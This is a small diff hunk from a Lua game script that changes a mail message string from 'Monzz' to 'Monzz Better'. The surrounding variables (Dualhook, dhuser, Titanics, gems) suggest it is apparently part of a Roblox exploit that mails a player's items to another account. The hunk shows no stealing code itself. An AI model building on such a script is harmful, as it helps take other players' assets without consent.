@@ -1187,7 +1187,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Monzz"
+local mailmsg = "Monzz Better"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
